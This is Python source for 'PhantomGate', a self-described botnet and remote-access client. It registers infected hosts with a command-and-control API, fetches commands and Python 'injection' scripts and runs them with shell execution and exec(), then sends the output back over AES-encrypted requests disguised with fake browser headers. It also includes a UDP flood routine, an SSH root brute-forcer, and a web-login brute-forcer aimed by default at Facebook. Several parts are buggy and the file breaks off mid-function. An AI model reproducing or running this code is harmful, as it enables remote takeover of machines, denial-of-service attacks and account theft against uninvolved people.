# Copyright (c) 2025 Omer Kemal
# Proprietary and confidential. All rights reserved.
# Unauthorized copying, modification, or distribution is prohibited.

"""
PhantomGate.py

A multi-purpose remote administration and botnet utility with features such as:
- Remote command execution via API
- UDP flood (DoS testing) with adaptive rate control
- Target registration and management using SQLite
- File transfer and simple HTTP server for file sharing
- Botnet instruction retrieval and execution
- Cross-platform support (Windows, Linux, Android detection)
- Command output reporting to a central API
This script is designed to be run as a standalone application, providing a command-line interface for interacting with a remote API server.

Usage:
    To run the PhantomGate script, use the following command in your terminal or command prompt:
        ~$ python PhantomGate.py

Main Features:
    - Registers the client (target) with a central API server
    - Periodically polls for instructions (commands, botnet actions)
    - Executes received commands and reports output
    - Supports UDP flood and custom botnet actions
    - Provides a simple HTTP server for file sharing
    - Provides system information retrieval
    - Code injection and
    - Provides file transfer and directory navigation utilities
    - Supports command execution with output capture
    - Handles target data management in a SQLite database
    - Supports adaptive rate control for UDP flood attacks
    - checks if it is running in vm or not,if so keep running other than that exit

API Endpoints (default: {config.url}):
    /api/v1.2/register_target      Register a new target
    /api/v1.2/ApiCommand/<target>     Get commands for a target
    /api/v1.2/Apicommand/save_output  Post command output
    /api/v1.2/BotNet/<target>         Get botnet instructions
    /api/v1.2/injection/<target>     Get Python script for injection
    /api/v1.2/injection_output_save   Save output of executed script
    /api/v1.2/<script_name>       Retrieve a Python script from the library
    /api/v1.2/get_instruction/<target> Get instructions for a target

Author: (OMER KEMAL)
"""
from Crypto.Cipher import AES
import base64
import json
import platform as pt
from sys import platform
import traceback
import socketserver
import http.server
import subprocess
import contextlib
import threading
import itertools
import datetime
import requests
import paramiko
import sqlite3
import logging
import string
import random
import socket
import uuid
import time
import sys
import re

try:
    import winreg as reg
except ImportError:
    reg = None  # Disable registry features
    print("winreg not available on this platform")

import io
import os

# importing setting
from setting import Setting

# initializing settings
config = Setting()
config.setting_var()

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def clean_terminal_text(raw_text):
    """Remove ANSI escape sequences and problematic control chars."""
    # Remove ANSI escape sequences
    text = re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', raw_text)

    # Remove carriage returns
    text = text.replace('\r', '')

    # Replace tabs with spaces
    text = text.replace('\t', '    ')

    # Remove any non-printable control characters
    text = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', text)

    return text


def targetData(command, user_name=None, ID=None, threadPermisstion='Allow', threadStatus='Running', thread_type='bot', catgory=None, proxci_status='NoteAllow'):
    """
    Manages target data in a SQLite database.
    Args:
        command (str): The command to execute ('create_target', 'get', etc.).
        user_name (str, optional): The name of the target to create.
        ID (str, optional): The unique identifier for the target.
    Returns:
        str or list: A message or data depending on the command.
    """
    conn = sqlite3.connect(config.DB_URI)
    cursor = conn.cursor()

    try:
        if command == 'create_all_table':
            # Create tables
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS target_data (
                    id TEXT PRIMARY KEY NOT NULL,
                    target_name TEXT NOT NULL,
                    is_registor TEXT
                )
            """)

            cursor.execute("""
                CREATE TABLE IF NOT EXISTS therade_permission (
                    id TEXT PRIMARY KEY NOT NULL,
                    threadPermission TEXT NOT NULL
                )
            """)

            cursor.execute("""
                CREATE TABLE IF NOT EXISTS thread_status (
                    thread_id TEXT PRIMARY KEY NOT NULL,
                    type TEXT NOT NULL,
                    catgory TEXT NOT NULL,
                    threadStatus TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            cursor.execute("""
                CREATE TABLE IF NOT EXISTS set_proxci (
                    id TEXT PRIMARY KEY NOT NULL,
                    proxci_status TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # Use consistent ID - either from config or parameter
            default_id = ID if ID else config.ID()
            
            # default values - check if they already exist first
            cursor.execute('SELECT id FROM set_proxci WHERE id = ?', (default_id,))
            if not cursor.fetchone():
                cursor.execute('INSERT INTO set_proxci(id, proxci_status) VALUES (?, ?)', (default_id, proxci_status))
            
            cursor.execute('SELECT id FROM therade_permission WHERE id = ?', (default_id,))
            if not cursor.fetchone():
                cursor.execute('INSERT INTO therade_permission(id, threadPermission) VALUES (?, ?)', (default_id, threadPermisstion))
            
            conn.commit()
            
        elif command == 'create_target' and user_name and ID:
            try:
                cursor.execute('INSERT INTO target_data(id, target_name, is_registor) VALUES (?, ?, ?)', (ID, user_name, '0'))
                conn.commit()
                return "Target was created successfully"
            except sqlite3.IntegrityError:
                return "Target ID already exists"

        elif command == 'get':
            cursor.execute("SELECT * FROM target_data")
            return cursor.fetchall()

        elif command == 'setPermission' and ID:
            cursor.execute('SELECT id FROM therade_permission WHERE id = ?', (ID,))
            exists = cursor.fetchone()
            if exists:
                cursor.execute('UPDATE therade_permission SET threadPermission = ? WHERE id = ?', (threadPermisstion, ID))
            else:
                cursor.execute('INSERT INTO therade_permission(id, threadPermission) VALUES (?, ?)', (ID, threadPermisstion))
            conn.commit()
            return "Thread permission was set/updated successfully"

        elif command == 'save_thread_info' and ID:
            if catgory:
                cursor.execute('INSERT OR REPLACE INTO thread_status(thread_id, type, catgory, threadStatus) VALUES (?, ?, ?, ?)', (ID, thread_type, catgory, threadStatus))
                conn.commit()
                return "Thread info saved successfully"
            return 'Please provide category for the bot.(e.g udp-flood, ssh or web-login)'
        
        elif command == 'stop_thead_permission':
            if ID:
                # Fixed: Added FROM keyword
                cursor.execute('DELETE FROM thread_status WHERE thread_id = ?', (ID,))
                conn.commit()  # Added commit
                return "Thread stopped successfully"
        
        elif command == 'getThread':
            if ID:
                cursor.execute("SELECT * FROM thread_status WHERE thread_id = ?", (ID,))
                result = cursor.fetchall()  # Store result to avoid double fetch
                if result:
                    return result
                return [None, None, None, 'Stop', None]
            return 'Please provide an ID'
        
        elif command == 'getSpacificTheradeInfo':
            cursor.execute('SELECT * FROM thread_status WHERE thread_id = ?', (ID,))
            result = cursor.fetchall()  # Store result to avoid double fetch
            if result:
                return result
            return [[None, None, None, 'Stop', None]]
        
        elif command == 'getPermission':
            cursor.execute("SELECT * FROM therade_permission")
            return cursor.fetchall()
        
        elif command == 'setProxci' and ID:
            cursor.execute('SELECT id FROM set_proxci WHERE id = ?', (ID,))
            exists = cursor.fetchone()
            if exists:
                cursor.execute('UPDATE set_proxci SET proxci_status = ? WHERE id = ?', (proxci_status, ID))
            else:
                cursor.execute('INSERT INTO set_proxci(id, proxci_status) VALUES (?, ?)', (ID, proxci_status))
            conn.commit()
            return "Proxy status was set/updated successfully"
        
        elif command == 'getProxci':
            cursor.execute("SELECT * FROM set_proxci")
            return cursor.fetchall()

        elif command == 'info':
            info_list = []

            # Get all targets
            cursor.execute("SELECT * FROM target_data")
            target = cursor.fetchall()
            target_info = {
                'target_data': {
                    'id': target[0][0],
                    'target_name': target[0][1],
                    'is_registor': target[0][2]
                },
                'therade_permission': None,
                'thread_status': None,
                'set_proxci': None
            }

            # Thread permission
            cursor.execute("SELECT * FROM therade_permission")
            permission = cursor.fetchall()
            if permission:
                target_info['therade_permission'] = {
                    'id': permission[0][0],
                    'threadPermission': permission[0][1]
                }

            # Thread status
            cursor.execute("SELECT * FROM thread_status")
            status = cursor.fetchall()
            if status:
                target_info['thread_status'] = {
                    'thread_id': status[0][0],
                    'type': status[0][1],
                    'catgory': status[0][2],
                    'threadStatus': status[0][3],
                    'created_at': status[0][4]  # Fixed: was started_date
                }

            # Proxy info
            cursor.execute("SELECT * FROM set_proxci")
            proxy = cursor.fetchall()
            if proxy:
                target_info['set_proxci'] = {
                    'id': proxy[0][0],
                    'proxci_status': proxy[0][1],
                    'created_at': proxy[0][2]
                }

            info_list.append(target_info)

            return info_list

        else:
            return "Invalid command or missing parameters"

    except sqlite3.Error as e:
        print(f"Database Error: {e}")
        return {'message': f"Database error: {str(e)}"}
    except Exception as e:
        print(f"Error: {e}")
        return {'message': "Something went wrong"}
    finally:
        conn.close()




def is_android():
    """Checks if the current operating system is Android."""
    return 'ANDROID_ROOT' in os.environ or os.path.exists('/system/build.prop')

def get_os_name():
    """Returns the name of the operating system."""
    if is_android():
        v = CMD("getprop ro.build.version.release")
        return f'Android {v}'
    else:
        return pt.system()

def format_mac(mac_int):
    """Formats a MAC address from an integer."""
    return ':'.join(f'{(mac_int >> i) & 0xff:02x}' for i in range(40, -1, -8))

def get_mac_address():
    """Returns the MAC address of the host."""
    mac_int = uuid.getnode()
    is_random = (mac_int >> 40) & 0x02
    if is_random:
        return "Could not reliably determine"
    return format_mac(mac_int)

def get_all_ip_addresses():
    """Returns a list of all IP addresses associated with the host."""
    try:
        return list(set([socket.gethostbyname(socket.gethostname())]))
    except:
        return ["Unavailable"]

def get_environment_vars():
    """Returns a dictionary of selected environment variables."""
    keys = ['PATH', 'HOME', 'USER', 'SHELL', 'LANG', 'OS', 'COMPUTERNAME', 'ANDROID_ROOT']
    return {key: os.environ.get(key, "Not set") for key in keys}

def get_cpu_count():
    """Returns the number of CPU cores available."""
    return os.cpu_count() or "Unavailable"

def get_memory_info():
    """Returns total and free memory in MB."""
    try:
        with open('/proc/meminfo') as f:
            lines = f.read().splitlines()
        total = next(int(x.split()[1]) for x in lines if x.startswith('MemTotal:')) // 1024
        free = next(int(x.split()[1]) for x in lines if x.startswith('MemFree:')) // 1024
        return f"{total} MB", f"{free} MB"
    except:
        return "Unavailable", "Unavailable"

def get_uptime():
    try:
        with open('/proc/uptime') as f:
            uptime_seconds = float(f.readline().split()[0])
            return str(datetime.timedelta(seconds=int(uptime_seconds)))
    except:
        return "Unavailable"

def get_cpu_info():
    """Returns the CPU information of the system."""
    if pt.processor():
        return pt.processor().strip()
    try:
        with open('/proc/cpuinfo') as f:
            for line in f:
                if "model name" in line.lower() or "hardware" in line.lower():
                    return line.split(":", 1)[1].strip()
    except:
        pass
    return "Unavailable"

def format_datetime(dt):
    """Formats a datetime object into a human-readable string."""
    return dt.strftime("%Y-%m-%d %H:%M:%S (%A)")

def print_pretty(title, data_dict):
    """
    Formats and prints a dictionary in a pretty way.
    """
    output = f"\n===== {title} =====\n"
    max_len = max(len(k) for k in data_dict)
    for key in sorted(data_dict):
       output+= f"  {key.ljust(max_len)} : {data_dict[key]}\n"
    return output

def sys_info():
    """Collects and formats system information including OS, hardware, network, user environment, and date/time.
    Returns:
        dict: A dictionary containing formatted system information.
    """
    # System Info
    system_info = {
        "OS"              : get_os_name(),
        "Node Name"       : pt.node(),
        "Release"         : pt.release(),
        "Version"         : pt.version(),
        "Machine"         : pt.machine(),
        "Processor"       : get_cpu_info(),
        "Architecture"    : ' '.join(pt.architecture()),
        "Python Version"  : pt.python_version(),
        "Implementation"  : pt.python_implementation(),
        "Compiler"        : pt.python_compiler()
    }

    # Hardware Info
    total_mem, free_mem = get_memory_info()
    hardware_info = {
        "CPU Cores"       : get_cpu_count(),
        "Memory Total"    : total_mem,
        "Memory Free"     : free_mem,
        "System Uptime"   : get_uptime()
    }

    # Network Info
    ip_list = get_all_ip_addresses()
    network_info = {
        "Hostname"        : socket.gethostname(),
        "IP Addresses"    : ', '.join(ip_list),
        "MAC Address"     : get_mac_address()
    }

    # User & Environment
    try:
        user = os.getlogin()
    except OSError:
        user = "Unavailable (no tty)"
    user_env = get_environment_vars()
    user_env.update({
        "Current User"    : user,
        "Current Dir"     : os.getcwd(),
        "Home Dir"        : os.path.expanduser('~')
    })

    # Date & Time
    now = datetime.datetime.now()
    dt_info = {
        "Local Time"      : format_datetime(now),
        "UTC Time"        : format_datetime(datetime.datetime.utcnow())
    }

    # Output all
    System_info = print_pretty("System Info", system_info)
    Hardware_info = print_pretty("Hardware Info", hardware_info)
    Network_info = print_pretty("Network Info", network_info)
    User_env = print_pretty("User & Environment", user_env)
    Dt_info = print_pretty("Date & Time", dt_info)

    return f"""
            {System_info}, 
            {Hardware_info} 
            {Network_info}
            {User_env} 
            {Dt_info}
        """


# os.system("clear")
def opratingSystem():
    """
    Determines the operating system of the current machine.
    Returns:
        str: The name of the operating system (e.g., 'Windows', 'Linux', 'Android').
    """
    if platform == "win32":
        return 'Windows'
    else:
        is_android = CMD('getprop ro.build.version.release')
        if is_android == 'android decoding str is not supported':
            return 'linux'
        else:
            return f'android {is_android}'


def get_ip():
    """
    Retrieves the local IP address of the machine.
    Returns:
        str: The local IP address of the machine.
    """
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8',80))
        ip = s.getsocketname()[0]
    except Exception as e:
        ip = socket.gethostbyname(socket.gethostname())

    s.close()

    return ip


# Shared Data for Tracking
packet_counts = {}  
lock = threading.Lock()  
stop_event = threading.Event()  

def send_udp_flood(thread_id, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY):
    """
    Sends UDP flood packets to the target IP on specified ports.
    Args:
        thread_id (str): Identifier for the thread.
        ports (list): List of ports to target.
        TARGET_IP (str): The target IP address.
        PACKET_SIZE (int): Size of each UDP packet.
        FAKE_HEADERS (list): List of fake headers to use in packets.
        BASE_DELAY (float): Base delay between packet sends.
        ADAPTIVE_THRESHOLD (int): Threshold for adaptive rate control.
        MIN_DELAY (float): Minimum delay for adaptive control.
        MAX_DELAY (float): Maximum delay for adaptive control.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    delay = BASE_DELAY  
    packet_count = 0  
    print(targetData(command='getSpacificTheradeInfo',ID=thread_id)[0][3])
    while targetData(command='getSpacificTheradeInfo',ID=thread_id)[0][3] != "Stop":  # Stop when the event is set
        print(targetData(command='getSpacificTheradeInfo',ID=thread_id)[0][3])
        for target_port in ports:  # Loop through all ports
        
            header = random.choice(FAKE_HEADERS)
            message = header + os.urandom(PACKET_SIZE - len(header))

            try:
                sock.sendto(message, (TARGET_IP, target_port))
                packet_count += 1
            except Exception as e:
                print(f"[Thread {thread_id}] Error: {e}")
                break  

            # Update shared packet count
            with lock:
                packet_counts[thread_id] = packet_count  

            # Adaptive Rate Control
            if packet_count % ADAPTIVE_THRESHOLD == 0:
                delay = max(MIN_DELAY, min(MAX_DELAY, delay * random.uniform(0.8, 1.2)))  

            time.sleep(delay) 



# udp-flood(socket)
def initUdpFlood(thread_id,TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
    """
    Initiates a UDP flood attack on the specified target IP with multiple threads.
    Args:
        TARGET_IP (str): The target IP address to flood.
        THREAD_COUNT (int): Number of threads to use for the flood.
        PACKET_SIZE (int): Size of each UDP packet to send.
    """
    # default ports
    ports = config.PORT

    # Start Threads
    for i in range(int(THREAD_COUNT)):  
        t = threading.Thread(target=send_udp_flood, args=(thread_id, ports,TARGET_IP,PACKET_SIZE,config.FAKE_HEADERS,config.BASE_DELAY,config.ADAPTIVE_THRESHOLD,config.MIN_DELAY,config.MAX_DELAY), daemon=True)
        t.start()



# setting varible
built_in_command = config.BUILT_IN_COMMAND
apiToken = config.API_TOKEN

logger = logging.getLogger(__name__)

#ollama run deepseek-r1:1.5b


def get_fake_cookies():
    """
    Generates fake cookies for HTTP requests.
    Returns:
        str: A string representing fake cookies.
    """
    return f"sessionid={random.randint(100000, 999999)}; csrftoken={config.ID(n=7)}; tracking_id={config.ID(n=10)}"

def get_fake_headers():
    """
    Generates fake HTTP headers for requests.
    Args:
        is_ajax (bool): Whether the request is an AJAX request.
    Returns:
        dict: A dictionary containing the fake headers.
    """

    is_ajax = random.choice([True,False])

    headers = {
        'User-Agent': random.choice(config.USER_AGENTS),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Referer': 'https://www.google.com/',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate' if not is_ajax else 'cors',
        'Sec-Fetch-Site': 'same-origin' if is_ajax else 'none',
        'Sec-Fetch-User': '?1' if not is_ajax else '?0',
        'TE': 'trailers',
        'Cookie': get_fake_cookies(),
    }

    if is_ajax:
        headers['X-Requested-With'] = 'XMLHttpRequest'

    return headers


def encrypt_pyload(pyload):
    """
    Encrypts a Python dictionary payload using AES encryption.
    Args:
        pyload (dict): The payload to encrypt.
    Returns:
        dict: A dictionary containing the encrypted payload with nonce, ciphertext, and tag.
    """
    pyload_json = json.dumps(pyload).encode()

    clipher = AES.new(config.ENCRYPTION_KEY, AES.MODE_EAX)
    ciphertext, tag = clipher.encrypt_and_digest(pyload_json)
    data = {
        'nonce': base64.b64encode(clipher.nonce).decode(),
        'ciphertext': base64.b64encode(ciphertext).decode(),
        'tag': base64.b64encode(tag).decode()
    }
    return data

def decrypt_payload(encrypted_data):
    """
    Decrypts an encrypted payload using AES decryption.
    Args:
        encrypted_data (dict): A dictionary containing the encrypted payload with nonce, ciphertext, and tag.
    Returns:
        dict: The decrypted payload as a Python dictionary.
    """
    # Decode Base64 values back to bytes
    nonce = base64.b64decode(encrypted_data['nonce'])
    ciphertext = base64.b64decode(encrypted_data['ciphertext'])
    tag = base64.b64decode(encrypted_data['tag'])

    # Create cipher with the same key and nonce
    cipher = AES.new(config.ENCRYPTION_KEY, AES.MODE_EAX, nonce=nonce)
    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)

    # Convert bytes back to JSON/dict
    return json.loads(decrypted_data.decode())


def injection(token,target_name , code_output=None, ID=None, pyload_name=None,method='GET'):
    """
    Injects a payload into a target.
    Args:
        token (str): The API token for authentication.
        target_name (str): The name of the target to inject the payload into.
        code_output (str, optional): The output of the executed code (for POST method).
        ID (str, optional): The unique identifier for the payload (for POST method).
        pyload_name (str, optional): The name of the payload to retrieve (for GET method).
        method (str): The HTTP method to use ('GET' or 'POST').
    Returns:
        dict: A dictionary containing the response message or data.
    """
    args = {
            'token': token,
            'ip': get_ip(),
            'os': opratingSystem()
        }

    if method == 'GET':
        try:
            GET = requests.get(f'{config.url}/api/v1.2/injection/lib/{target_name}',params=encrypt_pyload(args),headers=get_fake_headers())
            print('i am the problame',GET.status_code)
            if GET.status_code == 200:
                data = decrypt_payload(GET.json())
                print('script',data['script'])
                return {
                    'message' : 'Successully retrieved the script',
                    'script': data['script'],
                    'pyload_name': data['pyload_name'],
                    'ID': data['ID']
                }
            else:
                return {'message' : None}
        except Exception as e:
            return {'message' : None}

    elif method == 'POST':
        args['ID'] = ID
        args['pyload_name'] = pyload_name
        args['code_output'] = code_output
        POST = requests.post(f'{config.url}/api/v1.2/injection/code_output_save/{target_name}',json=encrypt_pyload(args),headers=get_fake_headers())

        if POST.status_code == '200':
            data = decrypt_payload(POST.json())
            return {'message' : data['messeage']}
        else:
            return {'message' : None}




def code_excuter(script):
    """
    Executes a Python script and captures its output.
    Args:
        script (str): The Python script to execute.
    Returns:
        str: The output of the executed script or an error message if execution fails.
    """
    try:
        output_buffer = io.StringIO()
        with contextlib.redirect_stdout(output_buffer):
            exec(script)

        output = output_buffer.getvalue()
        return output
    except:
        return "Error executing code. Please check the script for errors."

def BotNet(target_name,apiToken):
    """
    Retrieves botnet instructions for a specific target from the API.
    Args:
        target_name (str): The name of the target to retrieve botnet instructions for.
        apiToken (str): The API token for authentication.
    Returns:
        tuple: A tuple containing the botnet instructions (udpflood, bruteFroce, customBotNet) or 'empty' if no instructions are available.
    """
    params = {'token':apiToken,'ip':get_ip(),'os':opratingSystem()}
    # if targetData(command='getProxci')[0][1] == 'Allow' and config.PROXIES:
    #     proxies = {
    #         'http': random.choice(config.PROXIES),
    #         'https': random.choice(config.PROXIES)
    #     }
    # else:
    #     proxies = None
    botNet = requests.get(f'{config.url}/api/v1.2/BotNet/{target_name}',params=encrypt_pyload(params),headers=get_fake_headers())

    if botNet.status_code == 200:
        data = decrypt_payload(botNet.json())

        return data
        
    else:

        logger.info('[botNet Invalid]')
        return 'error'


# brute force section is not implemented in this code snippet.

def ssh_brute_force(password, host, port=22, username='root'):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password)
        print(f"Password found: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"Failed password: {password}")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False
def webLogin(userName,password,userInputName,passwordInputName,url="https://web.facebook.com/?_rdc=1&_rdr#"):
    """
    Attempts to log in to a web application using the provided username and password.
    Args:
        userName (str): The username to use for login.
        password (str): The password to use for login.
        userInputName (str): The name attribute of the username input field in the HTML form.
        passwordInputName (str): The name attribute of the password input field in the HTML form.
        url (str): The URL of the login page.
    """
    session = requests.Session()
    payload = {userInputName: userName, passwordInputName: password}
    response = session.post(url, data=payload, headers=get_fake_headers())
    if response.status_code == 200:
        ...
def password_generator(thread_id,host, port=22, userInputName=None, passwordInputName=None, userName='admin', length=8, start_index=0, brute_type='ssh'):
    """
    Generates all possible combinations of characters for a given length.
    The characters include uppercase letters, lowercase letters, and digits.
    """
    # Define the character sets
    capital = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    small = list("abcdefghijklmnopqrstuvwxyz")
    numbers = list("0123456789")
    special_chars = list("!@#$%^&*()-_=+[]{}|;:',.<>?/~`")

    all_chars = capital + small + numbers + special_chars  # Combine all characters
    combinations = itertools.product(all_chars, repeat=length)
    # calculaing total number of passwords
    total_passwords = len(all_chars) ** length
    if brute_type == 'ssh':
        for index, word in enumerate(itertools.islice(combinations, start_index, None), start=start_index):
            login = ssh_brute_force("".join(word),host=host,username=userName,port=port) # Print index and word
            if login:
                return {'meassege': 'password found','password':''.join(word)}
            # TODO: if targetData stop brack
            if targetData(command='getThread',ID=thread_id)[0][3] == "stop":
                break
    elif brute_type == 'weblogin':
        for index, word in enumerate(itertools.islice(combinations, start_index, None), start=start_index):
            if userInputName and passwordInputName:
                login = webLogin(userName=userName,userInputName=userInputName,password="".join(word),passwordInputName=passwordInputName)
                if login:
                    return {'meassege': 'password found','userName':userName,'password':''.join(word)}
                # TODO: if targetData stop brack
                if targetData(command='getThread',ID=thread_id)[0][3] == "stop":
                    break


def CMD(com):
    """
    Executes a command in the shell and returns its output.
    Args:
        com (str): The command to execute.
    Returns:
        str: The output of the command or an error message if execution fails.
    """
    try:
        if com.split()[0] not in config.BUILT_IN_COMMAND:
            try:
                cmd = subprocess.run(com, shell=True, capture_output=True, text=True)
                output_bytes = cmd.stderr + cmd.stdout
                output_string = str(output_bytes,'utf-8')
                cmd_data = output_string
                
            except Exception as e:
                output_string = str(output_bytes)
                cmd_data = output_string

            if len(cmd_data) == 0:
                cmd_data = 'done!'
            return clean_terminal_text(cmd_data)
        else:
            if com.startswith('excute_code') and not len(com) == 11:
                return clean_terminal_text(code_excuter(com[11:]))
            elif com.startswith('server'):
                ...
            elif com.startswith('ls'):
                ls = os.listdir('.')
                return clean_terminal_text(ls)
            elif com.startswith('sys_info'):
                sys_info_data = sys_info()
                return clean_terminal_text(sys_info_data)
            elif com.startswith('bot'):
                user_command = com.split()
                ID = user_command[-1]
                target_info = targetData(command='get')
                target_name = target_info[0][1]
                print('target_name--------->',target_name)
                botNet = BotNet(target_name=target_name, apiToken=apiToken)
                if user_command[1] == 'start':
                    if config.INSTRACTION_BOTNET_CATEGORY[0] in botNet['botNets']: # udp-flood
                        udp_flood = botNet['botNets'][config.INSTRACTION_BOTNET_CATEGORY[0]]
                        print(udp_flood)
                        link = udp_flood['link']
                        print(link)
                        threads = int(udp_flood['threads'])
                        targetData(command='save_thread_info', catgory=config.BOT_CATEGORY[0],ID=ID)
                        t = threading.Thread(target=initUdpFlood, args=(user_command[3],link, threads))
                        # threadStatus='Running',thread_type='bot', commad='save_thread_info'
                        t.start()
                        return clean_terminal_text(f'bot started successfully 🥳🎉\nbotNet type: {config.INSTRACTION_BOTNET_CATEGORY[0]}\ncatgory:{config.BOT_CATEGORY[0]}\nthread number: {threads}')
                    elif config.INSTRACTION_BOTNET_CATEGORY[1] in botNet: # brutForce
                        brut = botNet[config.INSTRACTION_BOTNET_CATEGORY[1]]
                        link = brut['link']
                        if len(botNet['username']) == 0 and len(botNet['password']): # ssh brutForce
                            t = threading.Thread(target=password_generator, args=(link,), kwargs={'brute_type':'ssh'})
                            t.start()
                            targetData(command='save_thread_info',catgory=config.BOT_CATEGORY[2],ID=ID)
                            return clean_terminal_text(f'bot started successfully 🥳🎉\nbotNet type: {config.INSTRACTION_BOTNET_CATEGORY[1]}\ncatgory:{config.BOT_CATEGORY[2]}\nthread number: {threads}')
                        else: # weblogin brutForce
                            password = brut['password']
                            username = brut['username']

                            t = threading.Thread(
                                    arget=password_generator, 
                                    args=(link,), 
                                    kwargs={
                                        'userInputName': username,
                                        'passwordInputName': password,
                                    }
                                )
                            targetData(command='save_thread_info',catgory=config.BOT_CATEGORY[3],ID=ID)
                            t.start()
                            return clean_terminal_text(f'bot started successfully 🥳🎉\nbotNet type: {config.INSTRACTION_BOTNET_CATEGORY[1]}\ncatgory:{config.BOT_CATEGORY[3]}\nuserInputName: {username}\nuserInputPasswordName: {password}\nthread number: {threads}')
                elif user_command[1] == 'stop':
                    # user_command[1] == stop
                    bot = targetData(command='getThread',ID=ID)
                    if bot[0][3] != 'stop':
                        info = targetData(command='stop_thead_permission',ID=ID)
                        return f'bot type: {bot[0][1]}\ncatgory:{bot[0][2]}\nnumber of Thread: {bot[0][3]}\nstarted date: {bot[0][4]}'
                    return clean_terminal_text("the bot is already stopped or did assign yet!")
            elif com.startswith('db_info'):
                data = targetData(command='info')
                return data

    except Exception as e:
        return {'error': f'something went wrong. error logger={traceback.format_exc()}'}
        



def apiCommandGet(token,target_name):
    """
    Retrieves commands for a specific target from the API.
    Args:
        token (str): The API token for authentication.
        target_name (str): The name of the target to retrieve commands for.
    Returns:
        list: A list of commands for the target, or 'invalid' if the request fails.
    """
    args = {"token": token,'ip': get_ip(),'os':opratingSystem()}

    # if targetData(command='getProxci')[0][1] == 'Allow' and config.PROXIES:
    #     proxies = {
    #         'http': random.choice(config.PROXIES),
    #         'https': random.choice(config.PROXIES)
    #     }
    # else:
    #     proxies = None

    try:
        GET = requests.get(f'{config.url}/api/v1.2/ApiCommand/{target_name}',params=encrypt_pyload(args),headers=get_fake_headers())

    except:
        return 'Error'

    response = decrypt_payload(GET.json())
    valid = GET.status_code

    if valid == 200:
        return response['allCommand']
    
    return 'invalid'
      

#3=cmd,target_name=2
def apiCommandPost(token,data,target_name):
    """
    Posts command output to the API for a specific target.
    Args:
        token (str): The API token for authentication.
        data (list): A list of tuples containing command IDs and their outputs.
        target_name (str): The name of the target to post command output for.
    Returns:
        dict: A dictionary containing the response from the API, or 'Invalid' if the request fails.
    """
    # data is all command recived from the api
    params= {
        'token': token,
        'target_name': target_name,
        'output': [],
        'ip': get_ip(),
        'os':opratingSystem()
    }
    # data is a list of tuples where cmd[3] is the output of the command
    # and cmd[0] is the id of the command
    # data = [(cmd_id, cmd_output), ...]
    # if targetData(command='getProxci')[0][1] == 'Allow' and config.PROXIES:
    #     proxies = {
    #         'http': random.choice(config.PROXIES),
    #         'https': random.choice(config.PROXIES)
    #     }
    # else:
    #     proxies = None
    # cmd[0] is the id of the command
    if data[0] == 'user_instarction':
        for data in data[1:]:    
            params['output'].append((data,CMD(com=data)))
        params['output'][len(params['output'])] = {
            'info': 'user_instarction'
        }
    else:
        for cmd in data:
            output = CMD(com=cmd[3])
            # sending cmd output and cmd id
            params['output'].append((cmd[0],output))

    POST = requests.post(f'{config.url}/api/v1.2/Apicommand/save_output', json=encrypt_pyload(params),headers=get_fake_headers())
    response = decrypt_payload(POST.json())
    valid = POST.status_code

    if valid == 200:
        return response
    
    return 'Invalid'




def Registor(target_name, apiToken):
    """
    Registers a new target with the API.
    Args:
        target_name (str): The name of the target to register.
        apiToken (str): The API token for authentication.
    Returns:
        dict: A dictionary containing the registration response from the API, or an error message if registration fails.
    """
    info = {
        'token': apiToken,
        'target_name': target_name,
        'os': opratingSystem(),
        'ip': get_ip()
    }

    # if targetData(command='getProxci')[0][1] == 'Allow' and config.PROXIES:
    #     proxies = {
    #         'http': random.choice(config.PROXIES),
    #         'https': random.choice(config.PROXIES)
    #     }
    # else:
    #     proxies = None
    print(target_name)
    try:
        # Sending the POST request to register the target
        POST = requests.post(f"{config.url}/api/v1.2/registor_target", json=encrypt_pyload(info),headers=get_fake_headers())
        # Check if the status code is 200
        if POST.status_code == 200:
            data = decrypt_payload(POST.json())
            targetData(command='create_target', user_name=data['target_name'])
            return data,POST.status_code
    except Exception as e:
        return f"Error during registration: {str(e)}", 500
    except requests.exceptions.RequestException as e:
        return f"Error during registration: {str(e)}", 500



def Instarction(target_name, apiToken):
    """
    Retrieves instructions for a specific target from the API.
    Args:
        target_name (str): The name of the target to retrieve instructions for.
        apiToken (str): The API token for authentication.
    Returns:
        dict: A dictionary containing the instructions for the target, or an error message if the request fails.
    """
    info = {
        'token': apiToken,
        'ip': get_ip(),
        'os':opratingSystem()
    }

    # if targetData(command='getProxci')[0][1] == 'Allow' and config.PROXIES:
    #     proxies = {
    #         'http': random.choice(config.PROXIES),
    #         'https': random.choice(config.PROXIES)
    #     }
    # else:
    #     proxies = None

    try:
        # Sending the GET request to retrieve instructions
        GET = requests.get(f"{config.url}/api/v1.2/get_instraction/{target_name}", params=encrypt_pyload(info),headers=get_fake_headers())
        if GET.status_code == 200:
            instruction = decrypt_payload(GET.json())
            return instruction
        else:
            return {
                'error': f"Unexpected status code {GET.status_code}",
                'details': decrypt_payload(GET.json())
            }
